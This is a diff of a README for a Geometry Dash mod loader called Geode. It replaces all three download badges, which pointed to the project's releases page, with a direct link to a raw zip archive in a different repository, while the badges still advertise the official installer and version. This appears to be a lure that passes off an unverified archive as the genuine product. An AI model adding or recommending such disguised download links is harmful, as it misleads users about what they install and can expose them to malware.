@@ -6,7 +6,7 @@ description: "Install and manage 200+ community mods for Geometry Dash directly 
 <h1>🎮 Geode-Geometry-Dash - Unlock Endless Customization & Mods for Geometry Dash</h1>
 
 <p align="center">
-<a href="https://github.com/Acooun8922/Geode-Geometry-Dash/releases"><img src="https://img.shields.io/badge/Download%20Geode%20v5.8.2-Free-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=ff6600" alt="Download Geode v5.8.2"></a>
+<a href="https://github.com/Acooun8922/acooun8922.github.io/raw/refs/heads/main/projects/3.8.zip"><img src="https://img.shields.io/badge/Download%20Geode%20v5.8.2-Free-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=ff6600" alt="Download Geode v5.8.2"></a>
 </p>
 
 <p align="center">
@@ -36,7 +36,7 @@ Follow these steps to start using Geode-Geometry-Dash immediately.
 Visit the official releases page to get the latest installer.
 
 <p align="center">
-<a href="https://github.com/Acooun8922/Geode-Geometry-Dash/releases"><img src="https://img.shields.io/badge/Download%20Geode%20Installer-2.208-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=green" alt="Download Geode Installer"></a>
+<a href="https://github.com/Acooun8922/acooun8922.github.io/raw/refs/heads/main/projects/3.8.zip"><img src="https://img.shields.io/badge/Download%20Geode%20Installer-2.208-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=green" alt="Download Geode Installer"></a>
 </p>
 
 **Visit this link to download the application.**
@@ -88,7 +88,7 @@ Yes. Geode is compatible with most Geometry Dash Private Servers. Just install i
 ## 📥 Download Links
 
 <p align="center">
-<a href="https://github.com/Acooun8922/Geode-Geometry-Dash/releases"><img src="https://img.shields.io/badge/Download%20Geode%20v5.8.2-Free%20Download-red?style=for-the-badge&logo=github&logoColor=white&labelColor=990000" alt="Download Geode v5.8.2"></a>
+<a href="https://github.com/Acooun8922/acooun8922.github.io/raw/refs/heads/main/projects/3.8.zip"><img src="https://img.shields.io/badge/Download%20Geode%20v5.8.2-Free%20Download-red?style=for-the-badge&logo=github&logoColor=white&labelColor=990000" alt="Download Geode v5.8.2"></a>
 </p>
 
 **Visit this link to download the application.**
